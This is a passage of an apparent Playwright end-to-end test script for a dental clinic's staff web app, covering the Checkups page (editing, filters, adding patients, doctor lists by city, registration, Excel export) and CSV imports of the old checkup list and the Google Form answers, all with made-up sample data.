  await pk.getByLabel('Name or phone').fill(name);
  await pk.waitForSelector(`table.checkup-table tbody tr[data-id="${id}"]`);
  const back = pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`);
  assert.equal(await back.locator('select[aria-label^="Follow-up status for"]').inputValue(), target);
  assert.equal(await back.locator('input[aria-label^="Notes for"]').inputValue(), 'Call back on Monday (test)');
  // the Edit dialog of an old-list row (no answers): the same questions as the checkup form, none of the four new ones required; it changes the fee and the doctor
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Source').selectOption('archive');
  await pk.waitForFunction(() => /source=archive/.test(location.hash) && document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false'
    && [...document.querySelectorAll('table.checkup-table tbody tr[data-id] td:nth-child(9)')].every((t) => /^Old list/.test(t.textContent.trim())));
  const oldRow = rowsOf(pk).filter({ hasNot: pk.locator('td.checkup-plan:not(:has(.muted))') }).first();
  const oldId = await oldRow.getAttribute('data-id');
  await oldRow.getByRole('button', { name: /^Edit / }).click();
  const m = pk.locator('.modal');
  assert.ok(await forGroup(m).count() && await doctorGroup(m).count(), 'the Edit dialog asks the questions of the form');
  for (const q of [/^Did Dr\. Ali recommend your treatment/, /^Did you understand the pricing details/, /^Would you like to start the treatment/]) {
    const group = m.getByRole('group', { name: q });
    assert.doesNotMatch(await group.locator('legend').innerText(), /required/, 'an old row has no answers, so this question is not required: ' + q);
    assert.equal(await group.getByRole('radio', { checked: true }).count(), 0, 'and nothing is chosen');
  }
  assert.doesNotMatch(await m.locator('.field-label', { hasText: 'If yes, then when?' }).innerText(), /required/, '"If yes, then when?" is not required either');
  await m.getByLabel(/Estimated fee/).fill('12000');
  for (const box of await doctorGroup(m).getByRole('checkbox', { checked: true }).all()) await box.uncheck();    // another doctor in place of the old one
  // (the first old row can be at a branch of another city, e.g. Islamabad: then Dr. Hina of Karachi waits behind the button)
  const moreDoctors = doctorGroup(m).getByRole('button', { name: /^Show doctors of other cities/ });
  if (await moreDoctors.count()) await moreDoctors.click();
  await doctorGroup(m).getByLabel('Dr. Hina (sample)', { exact: true }).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await pk.waitForSelector('.toast:has-text("saved")');
  await pk.waitForSelector('.modal', { state: 'detached' });
  const edited = pk.locator(`table.checkup-table tbody tr[data-id="${oldId}"]`);
  assert.match(await edited.innerText(), /Dr\. Hina \(sample\)/);
  // answers can be added to an old row later (after a follow-up call), one at a time; with one answer the row is still not the form, so a
  // later Edit that only fixes the phone number saves without the other three
  await edited.getByRole('button', { name: /^Edit / }).click();
  await m.getByRole('group', { name: /^Would you like to start the treatment/ }).getByLabel('No', { exact: true }).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.waitForFunction((id) => document.querySelector(`table.checkup-table tbody tr[data-id="${id}"] td:nth-child(5)`)?.textContent.trim() === 'No', oldId);
  await edited.getByRole('button', { name: /^Edit / }).click();
  assert.doesNotMatch(await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).locator('legend').innerText(), /required/, 'one answer: the other questions stay optional');
  await m.getByLabel(/^Mobile number/).fill('0300 5550199');
  await m.getByRole('button', { name: 'Save' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await edited.locator('.phone-link', { hasText: '0300 5550199' }).waitFor();
  // all four answered: the form is filled in for this checkup, and Edit asks for the four again
  await edited.getByRole('button', { name: /^Edit / }).click();
  await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).getByLabel('Yes', { exact: true }).check();
  await m.getByRole('group', { name: /^Did you understand the pricing details/ }).getByLabel('No', { exact: true }).check();
  await m.getByLabel(/^If yes, then when/).fill('Called back: price too high for now');
  await m.getByRole('button', { name: 'Save' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await edited.locator('.answer-line:has-text("Understood pricing: No")').waitFor();
  assert.match(await edited.innerText(), /Dr\. Ali recommended: Yes/);
  await edited.locator('td.checkup-plan:has-text("Called back: price too high for now")').waitFor();
  await edited.getByRole('button', { name: /^Edit / }).click();
  assert.match(await m.getByRole('group', { name: /^Did Dr\. Ali recommend your treatment/ }).locator('legend').innerText(), /required/);
  await m.getByLabel(/^If yes, then when/).fill('');
  await m.getByRole('button', { name: 'Save' }).click();
  await m.locator('.field-error:has-text("Write when they want to start, or why not.")').waitFor();
  await m.getByRole('button', { name: 'Cancel' }).click();
  await pk.locator('.modal', { hasText: 'Discard this checkup form?' }).getByRole('button', { name: 'Discard' }).click();   // (an answer was changed)
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByRole('button', { name: 'Clear filters' }).click();
});
// Answers are added in Edit after a follow-up call (and the form is filled in there for a row of an earlier day): every way of leaving it with
// a changed answer asks first, as the checkup form does; untouched it closes at once.
await step('Checkups page: Edit asks before changed answers are thrown away (Escape, the ×, a tap outside, Cancel, Back, a reload); untouched it closes at once', async () => {
  await pk.locator('.topnav a:has-text("Today")').click();
  await pk.waitForSelector('.stat');
  await openCheckups(pk);
  const row = rowsOf(pk).first();
  const id = await row.getAttribute('data-id');
  const m = pk.locator('.modal').first();
  const ask = pk.locator('.modal', { hasText: 'Discard this checkup form?' });
  await row.getByRole('button', { name: /^Edit / }).click();
  await m.waitFor();
  assert.equal(await reloadAsks(pk), false, 'untouched: a reload is not asked about');
  await pk.keyboard.press('Escape');
  await pk.waitForSelector('.modal', { state: 'detached' });
  await row.getByRole('button', { name: /^Edit / }).click();
  await m.getByRole('button', { name: 'Cancel' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await row.getByRole('button', { name: /^Edit / }).click();
  const plan = m.getByLabel(/^If yes, then when/);
  await plan.fill('Edit guard test');
  await m.getByRole('group', { name: /^Would you like to start the treatment/ }).getByLabel('Yes', { exact: true }).check();
  assert.equal(await reloadAsks(pk), true, "a changed answer: a reload or closing the tab gets the browser's own question");
  const hash = await pk.evaluate(() => location.hash);
  const keep = async (how) => {
    await ask.waitFor();
    assert.match(await ask.innerText(), /Your answers are not saved\./, how);
    assert.equal(await pk.evaluate(() => document.activeElement?.textContent), 'Keep filling in', `${how}: the safe choice has focus`);
    await ask.getByRole('button', { name: 'Keep filling in' }).click();
    await ask.waitFor({ state: 'detached' });
    assert.equal(await plan.inputValue(), 'Edit guard test', `${how}: the answer is still there`);
    assert.equal(await pk.evaluate(() => location.hash), hash, `${how}: still on the Checkups page`);
  };
  await pk.keyboard.press('Escape');
  await keep('Escape');
  await m.getByRole('button', { name: 'Close' }).click();
  await keep('the ×');
  await pk.mouse.click(4, 4);   // (the strip around the dialog)
  await keep('a tap outside');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await keep('Cancel');
  await pk.goBack();
  await keep('Back');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await ask.getByRole('button', { name: 'Discard' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await reloadAsks(pk), false, 'closed: a reload is not asked about');
  assert.doesNotMatch(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`).innerText(), /Edit guard test/, 'nothing was saved');
});
await step('Checkups page: the "Wants to start" filter shows only Yes or only No (rows without the answer match neither), and is kept in the address', async () => {
  const total = await pagerTotal(pk);
  await pk.locator('.checkup-filters').getByLabel('Wants to start').selectOption('yes');
  await pk.waitForFunction((n) => !document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  let col = await pk.locator('table.checkup-table tbody tr[data-id] td:nth-child(5)').allInnerTexts();
  assert.ok(col.length > 0 && col.every((t) => t.trim() === 'Yes'), 'only Yes: ' + col.join(','));
  assert.match(await pk.evaluate(() => location.hash), /wants=yes/);
  await pk.locator('.checkup-filters').getByLabel('Wants to start').selectOption('no');
  await pk.waitForFunction(() => /wants=no/.test(location.hash) && document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false');
  col = await pk.locator('table.checkup-table tbody tr[data-id] td:nth-child(5)').allInnerTexts();
  assert.ok(col.length > 0 && col.every((t) => t.trim() === 'No'), 'only No: ' + col.join(','));
  assert.ok((await pagerTotal(pk)) < total);
  await shot(pk, '20-checkups-wants-no');
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  assert.equal(await pk.locator('.checkup-filters').getByLabel('Wants to start').inputValue(), '');
});
await step('Checkups page: "+ Add checkup patient" adds an earlier day to the list (the date under "More"), and the branch can be changed by someone who works at every branch', async () => {
  await pk.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = pk.locator('.modal');
  const branchChoices = await m.getByLabel(/^Which branch did you visit/).locator('option').allTextContents();
  assert.deepEqual(branchChoices, ['Choose…', ...await pk.evaluate(async () => { const { state } = await import('/js/state.js'); return state.ref.branches.map((b) => b.name); })],
    "a drop-down of the website's branches");
  assert.equal(await m.getByLabel(/^Which branch did you visit/).inputValue(), '', 'Dr. Ali has no home branch and the list is not filtered by one: nothing is guessed');
  await m.getByLabel(/^Which branch did you visit/).selectOption({ label: 'North Nazimabad' });
  await fillCheckupForm(m, { name: 'Page Added Person', phone: '0300 5550102', checkupFor: ['Extraction', 'Braces'], doctorCount: 2, wants: 'No', plan: 'Wants to save up first' });
  await m.locator('summary', { hasText: 'More (optional)' }).click();
  await m.getByLabel(/^Date/).fill('2026-09-01');
  await m.getByLabel('Follow-up status').selectOption('Interested');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.waitForSelector('.toast:has-text("Page Added Person added as a checkup patient.")');
  await pk.getByLabel('Name or phone').fill('Page Added Person');
  const row = rowsOf(pk).filter({ hasText: 'Page Added Person' });
  await row.waitFor();
  assert.match(await row.innerText(), /1 Sep[a-z]* 2026/);
  await pk.waitForFunction(() => document.querySelector('.page-head p')?.textContent.trim() === '1 checkup patient matches these filters');   // one match reads in the singular
  assert.equal(await row.locator('select[aria-label^="Follow-up status for"]').inputValue(), 'Interested');
  assert.match(await row.innerText(), /Website/);
  assert.match(await row.innerText(), /Wants to save up first/);
  assert.match(await row.innerText(), /North Nazimabad/);
  // several ticks are stored the Google Form's way: the ticked choices in the list's order, joined with ", "
  const twoDoctors = (await pk.evaluate(async () => { const { state } = await import('/js/state.js'); return state.ref.clinicians.filter((c) => c.is_doctor && c.active !== false).map((c) => c.display_name); })).slice(0, 2);
  const treatment = (await row.locator('td').nth(2).innerText()).split('\n');
  assert.deepEqual(treatment.slice(0, 2), ['Braces, Extraction', twoDoctors.join(', ')], 'the Treatment cell: both ticks, then both doctors');
  await row.getByRole('button', { name: /^Edit / }).click();
  const em = pk.locator('.modal');
  assert.deepEqual([await ticked(forGroup(em)), await ticked(doctorGroup(em))], [['Braces', 'Extraction'], twoDoctors], 'Edit opens them as ticks again');
  assert.equal(await em.getByLabel(/^Other: what was the checkup for/).isVisible(), false);
  await em.getByRole('button', { name: 'Cancel' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByRole('button', { name: 'Clear filters' }).click();
});
// The clinic has 22 doctors in three cities: "Who did your checkup?" lists the branch's city first, so a Lahore assistant on a phone does not
// scroll past every Karachi doctor (no doctor's name is written into the test: they come from the website's list).
await step('the checkup form: the doctors of the branch\'s city (and of no city) first, the others behind "Show doctors of other cities"; the order follows the branch; a ticked one stays in sight; two columns on a phone', async () => {
  const docs = await pk.evaluate(async () => { const { state } = await import('/js/state.js'); return state.ref.clinicians.filter((c) => c.is_doctor && c.active !== false).map((c) => ({ name: c.display_name, region: c.region || null })); });
  const near = (city) => docs.filter((c) => !c.region || c.region === city).map((c) => c.name);
  const away = (city) => docs.filter((c) => c.region && c.region !== city).map((c) => c.name);
  await pk.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = pk.locator('.modal');
  const g = doctorGroup(m);
  const more = g.getByRole('button', { name: /doctors of other cities/ });
  assert.deepEqual(await tickLabels(g), [...docs.map((c) => c.name), 'Other'], 'no branch chosen yet: every doctor, in the website\'s order');
  assert.equal(await more.isVisible(), false);
  await m.getByLabel(/^Which branch did you visit/).selectOption({ label: 'Gulberg Lahore' });
  assert.deepEqual(await tickLabels(g), [...near('LHR'), 'Other'], 'Lahore: its doctors and those of no city');
  assert.equal(await more.innerText(), `Show doctors of other cities (${away('LHR').length})`);
  // the error of the question marks a box in sight (the first Lahore one), and a tick clears it
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await m.locator('.field-error:has-text("Choose who did the checkup.")').waitFor();
  assert.deepEqual(await g.locator('input[aria-invalid="true"]').evaluateAll((els) => els.map((e) => e.labels[0].textContent.trim())), [near('LHR')[0]]);
  await more.click();
  const fromKarachi = docs.find((c) => c.region === 'KHI').name;
  await g.getByLabel(fromKarachi, { exact: true }).check();
  assert.equal(await m.locator('.field-error:has-text("Choose who did the checkup.")').count(), 0, 'a tick on a box further down clears the error too');
  await more.click();
  assert.deepEqual(await tickLabels(g), [...near('LHR'), fromKarachi, 'Other'], 'a ticked doctor of another city stays in sight');
  assert.equal(await more.innerText(), `Show doctors of other cities (${away('LHR').length - 1})`);
  await m.getByLabel(/^Which branch did you visit/).selectOption({ label: 'North Nazimabad' });
  assert.deepEqual(await tickLabels(g), [...near('KHI'), 'Other'], 'the order follows the branch: Karachi now');
  assert.deepEqual(await ticked(g), [fromKarachi]);
  // a phone: two columns of tick boxes, so the next question is close
  await pk.setViewportSize({ width: 390, height: 844 });
  assert.equal(await g.locator('.choice-row').evaluate((el) => getComputedStyle(el).gridTemplateColumns.split(' ').length), 2, 'two columns at 390 px');
  assert.ok(await pk.evaluate(() => document.documentElement.scrollWidth <= innerWidth), 'no sideways scrolling');
  await g.scrollIntoViewIfNeeded();
  await shot(pk, 'r31-form-390-doctors');
  await pk.setViewportSize({ width: 1366, height: 860 });
  await m.getByRole('button', { name: 'Cancel' }).click();
  await pk.locator('.modal', { hasText: 'Discard this checkup form?' }).getByRole('button', { name: 'Discard' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
});
await step('the branch is never guessed: someone who works at every branch without a home branch chooses it ("+ Add checkup patient" on the Today page asks for it, and only then); the Checkups page starts at the branch it is filtered on', async () => {
  await pk.locator('.topnav a:has-text("Today")').click();
  await pk.locator('section.today-checkup').getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = pk.locator('.modal');
  await m.waitFor();   // (the Today page loads the dialog's code on the first press)
  assert.deepEqual(await quickFields(m), ['Patient full name', 'Mobile number', 'Branch'], 'the name, the mobile number and the branch');
  assert.equal(await m.getByLabel(/^Branch/).inputValue(), '');
  assert.equal(await m.getByLabel(/^Branch/).locator('option:checked').innerText(), 'Choose…');
  await m.getByRole('button', { name: 'Add to the list' }).click();
  await m.locator('.field-error:has-text("Choose the branch.")').waitFor();
  await m.getByRole('button', { name: 'Cancel' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.goto(BASE + '#/staff/checkups?branch=3');
  await pk.waitForFunction(() => document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false');
  await pk.getByRole('button', { name: '+ Add checkup patient' }).click();
  assert.equal(await m.getByLabel(/^Which branch did you visit/).locator('option:checked').innerText(),
    await pk.evaluate(async () => { const { branchName } = await import('/js/state.js'); return branchName(3); }));
  await m.getByRole('button', { name: 'Cancel' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByRole('button', { name: 'Clear filters' }).click();
});
await step("Checkups page: \"+ Add checkup patient\" flags a phone number already on that branch's list for the day, and the flag follows the date", async () => {
  await pk.getByRole('button', { name: '+ Add checkup patient' }).click();
  const m = pk.locator('.modal');
  await m.getByLabel(/^Which branch did you visit/).selectOption({ label: 'North Nazimabad' });
  await m.getByLabel(/^Patient full name/).fill('Page Added Person');
  await m.getByLabel(/^Mobile number/).fill('0300 5550102');
  await m.locator('summary', { hasText: 'More (optional)' }).click();
  await m.getByLabel(/^Date/).fill('2026-09-01');
  await m.getByLabel(/^Mobile number/).press('Tab');
  await m.locator('.alert-warning:has-text("Already on the list for 1 Sep")').waitFor();
  await m.getByLabel(/^Date/).fill('2026-08-31');
  await pk.waitForFunction(() => !document.querySelector('.modal')?.textContent.includes('Already on the list for'));
  assert.match(await m.innerText(), /Goes on the Checkups page, and on that branch's Aaj ki List for today \(another day can be chosen under More\)\./);
  await m.getByRole('button', { name: 'Cancel' }).click();
  await pk.locator('.modal', { hasText: 'Discard this checkup form?' }).getByRole('button', { name: 'Discard' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
});
await step('Checkups page: "Register" gives a patient file and an Mr#; the row then links to the patient and offers no second Register', async () => {
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Patient file').selectOption('no');
  await pk.waitForFunction(() => document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false' && document.querySelector('table.checkup-table tbody tr[data-id]') && !document.querySelector('table.checkup-table tbody a.mr'));
  const row = rowsOf(pk).first();
  const id = await row.getAttribute('data-id');
  await row.getByRole('button', { name: /^Register / }).click();
  const m = pk.locator('.modal');
  await m.getByRole('button', { name: 'Create patient file' }).waitFor();
  assert.match(await m.innerText(), /This creates a patient file for .+ with the next Mr#, using this name, phone and branch[.] Use it when they start treatment[.]/);
  await m.getByRole('button', { name: 'Create patient file' }).click();
  await m.locator('.registered-mr').waitFor();
  const mr = (await m.locator('.registered-mr').innerText()).match(/Registered: Mr# (\d+)/)[1];
  assert.ok(await m.getByRole('button', { name: 'Open patient file' }).count());
  await m.locator('button.btn', { hasText: 'Close' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  // the registered person is found again by the open row id
  const link = pk.locator(`table.checkup-table tbody tr[data-id="${id}"] a.mr`);
  if (!(await link.count())) {
    await moreFilters(pk);
    await pk.locator('.checkup-filters').getByLabel('Patient file').selectOption('yes');
    await pk.waitForSelector(`table.checkup-table tbody tr[data-id="${id}"] a.mr`);
  }
  assert.equal((await pk.locator(`table.checkup-table tbody tr[data-id="${id}"] a.mr`).innerText()).trim(), `Mr# ${mr}`);
  assert.equal(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`).getByRole('button', { name: /^Register / }).count(), 0, 'a second Register is not offered');
  await pk.locator(`table.checkup-table tbody tr[data-id="${id}"] a.mr`).click();
  await pk.waitForSelector('h1:has-text("Mr# ' + mr + '"), main:has-text("Mr# ' + mr + '")');
});
await step('Checkups page: front desk has no "Download Excel"; the admin downloads a real workbook with the export header and every filtered row', async () => {
  await pk.route('**/xlsx.mjs', (r) => r.fulfill({
    contentType: 'text/javascript',
    body: 'export const utils = { book_new: () => ({ SheetNames: [], Sheets: {} }), aoa_to_sheet: (aoa) => ({ __aoa: aoa }), book_append_sheet: (wb, ws, name) => { wb.SheetNames.push(name); wb.Sheets[name] = ws; } };\n'
      + 'export function writeFile(wb, name) { window.__xlsx = { name, aoa: wb.Sheets[wb.SheetNames[0]].__aoa }; }\n',
  }));
  await openCheckups(pk);
  await pk.getByRole('button', { name: 'Clear filters' }).click().catch(() => {});
  const total = await pagerTotal(pk);
  await pk.getByRole('button', { name: 'Download Excel' }).click();
  await pk.waitForFunction(() => window.__xlsx);
  const x = await pk.evaluate(() => window.__xlsx);
  assert.match(x.name, /^checkups_ALL_\d{4}-\d{2}-\d{2}\.xlsx$/);
  assert.deepEqual(x.aoa[0], ['Month', 'Patient Name', 'Phone', 'City', 'Clinic', 'Doctor', 'Treatment / Checkup For', 'Est. Fee (Rs)', 'Status', 'Notes', 'Source Tab', 'Date', 'Day status', 'Treatment details', 'Source', 'Mr#', 'Added on',
    'Dr. Ali recommended', 'Understood pricing', 'Wants to start', 'When / why not']);
  const added = x.aoa.find((r) => r[1] === 'Page Added Person');
  assert.deepEqual(added.slice(17), ['Yes', 'Yes', 'No', 'Wants to save up first'], 'the answers of the checkup form are in the file');
  assert.equal(x.aoa.length - 1, total, 'one line per checkup');
  assert.ok(x.aoa.slice(1).every((r) => typeof r[2] === 'string'), 'phones are text');
  // a narrower download follows the filters and names the branch
  await pk.evaluate(() => { window.__xlsx = null; });
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Branch').selectOption({ label: 'North Nazimabad' });
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing'));
  const nn = await pagerTotal(pk);
  await pk.getByRole('button', { name: 'Download Excel' }).click();
  await pk.waitForFunction(() => window.__xlsx);
  const y = await pk.evaluate(() => window.__xlsx);
  assert.match(y.name, /^checkups_NN_/);
  assert.equal(y.aoa.length - 1, nn);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  // the front desk of the first page has no download
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  await page.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await page.getByRole('button', { name: 'Download Excel' }).count(), 0);
  assert.ok(await page.getByRole('button', { name: '+ Add checkup patient' }).count(), 'but they may add a checkup patient');
});
await step('Admin -> Import -> "5. Checkup list": a file in the owner\'s layout is previewed and imported; the same file again adds nothing', async () => {
  await pk.goto(BASE + '#/staff/admin?tab=import');
  await pk.waitForSelector('h2:text("5. Checkup list")');
  const dash = '—';
  const csv = [
    'Checkup list (sample),,,,,,,,,,', 'Made-up names for the test only,,,,,,,,,,', ',,,,,,,,,,',
    'Month,Patient Name,Phone,City,Clinic,Doctor,Treatment / Checkup For,Est. Fee (Rs),Status,Notes,Source Tab',
    'Dec 2024,Import Test Alpha,0300-5550201,Karachi,RJ Mall,Dr. Ali Rashid (sample),Scaling,,Follow-up Sent,,Sample tab A',
    '2026-03-01,Import Test Beta,0300-5550202,Lahore,Lahore Gulberg,Dr. Nida (sample),Braces consult,8000,Interested,Wants to think,Sample tab B',
    `Not recorded,Import Test Gamma,0300-5550203,${dash},${dash},${dash},${dash},,Not Contacted,,Sample tab A`,
    'Jun 2025,Import Test Delta,0300-5550204,Karachi,North Nazimabad,,Checkup,,Started,,Sample tab C', ''].join('\n');
  const section = pk.locator('section.panel:has(h2:text("5. Checkup list"))');
  await section.locator('input[type=file]').setInputFiles({ name: 'checkups-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await section.getByRole('button', { name: 'Import 4 checkups' }).waitFor();
  // The box is emptied once the file is read: a browser sends no `change` for the very same file again, and this page promises that a second drop changes nothing.
  assert.deepEqual(await section.locator('input[type=file]').evaluate((el) => [el.value, el.files.length]), ['', 0], 'ready to take the same file again');
  const text = await section.innerText();
  assert.match(text, /4\s+ready to import/);
  assert.match(text, /1\s+without a month/);
  assert.match(text, /1\s+with a fee/);
  assert.match(text, /RJ Mall\s+Gulshan \(RJ Mall\)\s+1/, 'RJ Mall goes to the Gulshan branch');
  assert.match(text, /Lahore Gulberg\s+Gulberg Lahore\s+1/);
  assert.match(text, /\(empty\)\s+No branch\s+1/);
  assert.match(text, /Follow-up Sent\s+1/);
  assert.match(text, /Not Contacted\s+1/);
  assert.match(text, /Dec 2024 to Mar 2026/);
  await shot(pk, '16-import-checkups');
  await section.getByRole('button', { name: 'Import 4 checkups' }).click();
  await section.locator('.alert-info:has-text("Checkup list:")').waitFor();
  assert.match(await section.locator('.alert-info').innerText(), /4 added, 0 updated, 0 already there/);
  assert.ok(await section.locator('a:has-text("Open the checkup list")').count());
  await section.locator('input[type=file]').setInputFiles({ name: 'checkups-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await section.getByRole('button', { name: 'Import 4 checkups' }).waitFor();
  await section.getByRole('button', { name: 'Import 4 checkups' }).click();
  await section.locator('.alert-info:has-text("Checkup list:")').waitFor();
  const again = await section.locator('.alert-info').innerText();
  assert.match(again, /0 added/);
  assert.match(again, /4 already there/);
});
await step('Import: a file without the Patient Name and Phone header is refused in plain words', async () => {
  const section = pk.locator('section.panel:has(h2:text("5. Checkup list"))');
  await section.locator('input[type=file]').setInputFiles({ name: 'wrong.csv', mimeType: 'text/csv', buffer: Buffer.from('Colour,Size\nred,big\n') });
  await section.locator('.alert-stop:has-text("No checkup list found in this file")').waitFor();
  assert.match(await section.locator('.alert-stop').innerText(), /Patient Name and Phone/);
});
// The old answers of the Google Form "Checkup Patient Form 2.0" (owner, 12 Oct 2026: "bring the old 470 entries too, and design the form
// submitted entries all in similar way too"). A made-up CSV in the layout of the "Form Responses 2" tab.
await step('Admin -> Import -> "6. Checkup Form 2.0 answers": the Form Responses CSV is previewed (new, onto a checkup on the list, skipped and why, wrong column, branches, REMINDERS), imported once, and shown like website entries "From the Google Form"', async () => {
  const k = new Date(Date.now() + 5 * 3600000);   // today in Karachi
  const today = `${k.getUTCMonth() + 1}/${k.getUTCDate()}/${k.getUTCFullYear()} 00:00:05`;
  const csv = [
    'Timestamp,Patient Full Name,Which Branch did you visit?,Mobile Number,Who did your Checkup?,Did Dr. Ali recommend your treatment?,What was your checkup for?,Did you understand the pricing details?,Would you like to start the treatment?,If yes then when? If no then why not?,REMINDERS',
    '8/21/2026 19:25:03,Form Test Alpha,RJ Mall - Karachi,0300-5550811,Dr. Hina (sample),Yes,General Checkup,Yes,Yes,Next month,done',
    '8\\27\\2026     16.05.9,Form Test Bravo,DHA Phase 6 - Karachi,3005550812,Someone (sample),No,"Braces, Scaling and Polishing",Needs More Clear Explanation,No,Too far from home,not on whatsapp',
    '9/2/2026 10:00:00,Form Test Charlie,Lahore - Gulberg,0300-5550813,,Yes,Crown/Bridge,Form Test Someone,Lahore - Gulberg,,',
    '3/10/2026 11:00:00,Import Test Beta,Lahore - Gulberg,0300-5550202,,Yes,Braces,Yes,Yes,After Eid,Started',
    `${today},Form Test Today,RJ Mall - Karachi,0300-5550815,,Yes,Braces,Yes,Yes,Soon,`,
    '9/3/2026 11:00:00,,RJ Mall - Karachi,0300-5550816,,Yes,Braces,Yes,Yes,,',
    'soon,Form Test Bad Date,RJ Mall - Karachi,0300-5550817,,Yes,Braces,Yes,Yes,,', ''].join('\r\n');
  await pk.goto(BASE + '#/staff/admin?tab=import');
  await pk.waitForSelector('h2:text("6. Checkup Form 2.0 answers")');
  const section = pk.locator('section.panel:has(h2:text("6. Checkup Form 2.0 answers"))');
  assert.ok(await section.getByText('Checkup Form 2.0 answers (CSV downloaded from the Form Responses tab)').count(), 'the field says which file');
  await section.locator('input[type=file]').setInputFiles({ name: 'Checkup karwaliya - Form Responses 2.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await section.getByRole('button', { name: 'Import 5 answers' }).waitFor();
  const text = await section.innerText();
  assert.match(text, /5\s+answers, 10 Mar 2026 to/, 'five answers can go in (three rows are skipped)');
  assert.match(text, /3\s+new checkups/);
  assert.match(text, /1\s+put on a checkup already on the list/);
  assert.match(text, /0\s+already on the website/);
  assert.match(text, /3\s+skipped/);
  assert.match(text, /0 answers go onto a checkup of the same person at the same branch on the same day .*, 1 answer goes onto the old list's row of that person and month \(its follow-up status stays\)/);
  assert.match(text, /DHA Phase 6 - Karachi\s+DHA Karachi\s+1/, 'an old spelling of a branch');
  assert.match(text, /RJ Mall - Karachi\s+Gulshan \(RJ Mall\)\s+2/);
  assert.match(text, /Follow-up Sent\s+1/);
  assert.match(text, /No Response\s+1/);
  assert.match(text, /Started\s+1/);
  assert.match(text, /Empty: Not Contacted\s+2/);
  assert.match(text, /1 answer has a follow-up status from REMINDERS that the checkup does not take \(it has another status, or it is the old list's row\): it is added to its notes, e\.g\. "Reminder \(Google Form\): Follow-up Sent"\./);
  assert.match(text, /1 row has an answer in the wrong place: row 4 \(Did you understand the pricing details\?; Would you like to start the treatment\?\)\. It is imported with those answers empty; what was written there is kept in the notes\./);
  assert.match(text, /1 row has a date that could not be read and is skipped/);
  assert.match(text, /1 name given for "Who did your checkup\?" is not on the website's doctor list and is kept as written: Someone \(sample\) \(1\)/, 'a doctor of the website\'s list is matched; anyone else stays as written');
  await section.locator('summary:has-text("3 rows are skipped")').click();
  const skipped = await section.locator('details table tbody tr').allInnerTexts();
  assert.deepEqual(skipped.map((t) => t.replace(/\s+/g, ' ').trim()), [
    "6 Given today: today's list is still kept in the Google Sheet. Import the file again tomorrow.", '7 No patient name', '8 The date could not be read']);
  await shot(pk, '17-import-checkup-form');
  await section.getByRole('button', { name: 'Import 5 answers' }).click();
  await section.locator('.alert-info:has-text("Checkup Form 2.0:")').waitFor();
  assert.match(await section.locator('.alert-info').innerText(),
    /Checkup Form 2\.0: 3 added, 1 put on a checkup already on the list, 0 already imported, 0 already had these answers, 3 skipped\. 1 follow-up status from REMINDERS was added to the notes instead\./);
  // the same file again: nothing changes
  await section.locator('input[type=file]').setInputFiles({ name: 'Checkup karwaliya - Form Responses 2.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await section.locator('.stat:has(strong:text-is("4")):has-text("already on the website")').waitFor();
  assert.match(await section.innerText(), /0\s+new checkups/);
  await section.getByRole('button', { name: 'Import 5 answers' }).click();
  await section.locator('.alert-info:has-text("Checkup Form 2.0:")').waitFor();
  assert.match(await section.locator('.alert-info').innerText(), /0 added, 0 put on a checkup already on the list, 4 already imported/);
  // on the Checkups page: like website entries, marked "From the Google Form"
  await section.getByRole('link', { name: 'Open the checkups from the Google Form →' }).click();
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 3);
  const alpha = rowsOf(pk).filter({ hasText: 'Form Test Alpha' });
  const cells = (await alpha.locator('td, th').allInnerTexts()).map((t) => t.replace(/\s+/g, ' ').trim());
  assert.equal(cells[0], '21 Aug 2026', 'the day of the answer');
